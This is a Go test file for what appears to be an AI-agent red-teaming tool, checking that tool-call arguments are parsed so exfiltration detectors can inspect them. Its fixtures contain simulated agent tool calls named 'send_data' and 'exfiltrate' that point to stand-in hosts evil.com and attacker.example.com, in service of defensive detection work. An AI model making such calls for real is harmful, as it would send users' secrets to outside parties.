package agent

import (
	"testing"

	"github.com/praetorian-inc/augustus/pkg/attempt"
)

// TestParseToolCall_StringArgs verifies that when the "args" field is a JSON
// string (the OpenAI wire format), parseToolCall unmarshals it into a map so
// that downstream detectors (e.g. ArgumentExfiltrationDetector) can inspect it.
// This locks in the fix from commit 7b20812.
func TestParseToolCall_StringArgs(t *testing.T) {
	tcMap := map[string]any{
		"name": "f",
		"args": `{"k":"v","nested":{"x":1}}`,
	}

	tc := parseToolCall(tcMap)

	if tc.Name != "f" {
		t.Errorf("Name = %q, want %q", tc.Name, "f")
	}
	if tc.Args == nil {
		t.Fatal("Args is nil; expected map[string]any parsed from JSON string")
	}
	if got, ok := tc.Args["k"]; !ok || got != "v" {
		t.Errorf(`Args["k"] = %v, want "v"`, got)
	}
	nested, ok := tc.Args["nested"].(map[string]any)
	if !ok {
		t.Fatalf(`Args["nested"] = %T, want map[string]any`, tc.Args["nested"])
	}
	if got := nested["x"]; got != float64(1) {
		t.Errorf(`Args["nested"]["x"] = %v (%T), want float64(1)`, got, got)
	}
}

// TestParseToolCall_MalformedStringArgs verifies that when the "args" field is
// an invalid JSON string, parseToolCall does NOT panic and preserves the raw
// string under the "_raw_args" sentinel key so that downstream detectors can
// still run their regex chains against the payload (Gemini #2 fix).
func TestParseToolCall_MalformedStringArgs(t *testing.T) {
	const raw = "{not valid"
	tcMap := map[string]any{
		"name": "g",
		"args": raw,
	}

	tc := parseToolCall(tcMap) // must not panic

	if tc.Name != "g" {
		t.Errorf("Name = %q, want %q", tc.Name, "g")
	}
	// Malformed JSON string: Args must be a non-nil map containing the raw
	// payload under the "_raw_args" sentinel key so downstream detectors can
	// still run their regex chains against the payload.
	if tc.Args == nil {
		t.Fatal("Args = nil; want non-nil map with _raw_args sentinel for malformed JSON string")
	}
	if got, ok := tc.Args["_raw_args"]; !ok {
		t.Error("Args missing _raw_args key for malformed JSON string")
	} else if got != raw {
		t.Errorf("Args[\"_raw_args\"] = %v, want %q", got, raw)
	}
}

// TestParseToolCall_StringArgs_EndToEnd verifies that string-encoded args flow
// through extractToolCalls (the []any branch) so that downstream detectors
// receive a populated ToolCall.Args map, not nil.
func TestParseToolCall_StringArgs_EndToEnd(t *testing.T) {
	a := attempt.New("string-args end-to-end")
	a.Metadata[attempt.MetadataKeyToolCalls] = []any{
		map[string]any{
			"name": "send_data",
			"args": `{"destination":"https://evil.com","payload":"secret"}`,
		},
	}

	toolCalls := extractToolCalls(a)

	if len(toolCalls) != 1 {
		t.Fatalf("extractToolCalls returned %d tool calls, want 1", len(toolCalls))
	}
	tc := toolCalls[0]
	if tc.Name != "send_data" {
		t.Errorf("Name = %q, want %q", tc.Name, "send_data")
	}
	if tc.Args == nil {
		t.Fatal("Args is nil after extractToolCalls; string-encoded args not parsed")
	}
	if got := tc.Args["destination"]; got != "https://evil.com" {
		t.Errorf(`Args["destination"] = %v, want "https://evil.com"`, got)
	}
}

// TestParseStringList_BareScalar is a regression test for commit 787033d which
// added the `case string:` branch to parseStringList. Before the fix, a bare
// YAML scalar (e.g. scoped_tools: "edit_tool") was decoded by gopkg.in/yaml.v3
// as Go type string, not []any, causing parseStringList to return nil and the
// caller to silently fall back to defaults. The fix returns a single-element
// slice for a non-empty string, nil for an empty string, and nil for unrelated
// types such as int.
func TestParseStringList_BareScalar(t *testing.T) {
	tests := []struct {
		name  string
		input any
		want  []string
	}{
		{
			name:  "bare non-empty string scalar",
			input: "edit_tool",
			want:  []string{"edit_tool"},
		},
		{
			name:  "bare empty string scalar",
			input: "",
			want:  nil,
		},
		{
			name:  "[]string passthrough",
			input: []string{"a", "b"},
			want:  []string{"a", "b"},
		},
		{
			name:  "[]any with string elements",
			input: []any{"a", "b"},
			want:  []string{"a", "b"},
		},
		{
			name:  "nil",
			input: nil,
			want:  nil,
		},
		{
			name:  "integer (unknown type)",
			input: 42,
			want:  nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := parseStringList(tt.input)
			if len(got) != len(tt.want) {
				t.Fatalf("parseStringList(%T(%v)) = %v (len %d), want %v (len %d)",
					tt.input, tt.input, got, len(got), tt.want, len(tt.want))
			}
			for i := range got {
				if got[i] != tt.want[i] {
					t.Errorf("parseStringList result[%d] = %q, want %q", i, got[i], tt.want[i])
				}
			}
		})
	}
}

// TestExtractToolCalls_AnyFallback verifies that when Metadata[ToolCalls] holds
// a []any value (the JSON-decoded production path), extractToolCalls correctly
// extracts tool calls via the type-switch fallback branch. This prevents silent
// rot in the fallback path that was previously uncovered by tests.
func TestExtractToolCalls_AnyFallback(t *testing.T) {
	a := attempt.New("any-fallback")
	a.Metadata[attempt.MetadataKeyToolCalls] = []any{
		map[string]any{
			"name": "exfiltrate",
			"args": map[string]any{"url": "https://attacker.example.com"},
		},
		map[string]any{
			"name": "summarize",
		},
	}

	toolCalls := extractToolCalls(a)

	if len(toolCalls) != 2 {
		t.Fatalf("extractToolCalls returned %d tool calls, want 2", len(toolCalls))
	}

	if toolCalls[0].Name != "exfiltrate" {
		t.Errorf("toolCalls[0].Name = %q, want %q", toolCalls[0].Name, "exfiltrate")
	}
	if toolCalls[0].Args == nil {
		t.Error("toolCalls[0].Args is nil; expected map from []any fallback path")
	}
	if got := toolCalls[0].Args["url"]; got != "https://attacker.example.com" {
		t.Errorf(`toolCalls[0].Args["url"] = %v, want "https://attacker.example.com"`, got)
	}

	if toolCalls[1].Name != "summarize" {
		t.Errorf("toolCalls[1].Name = %q, want %q", toolCalls[1].Name, "summarize")
	}
}
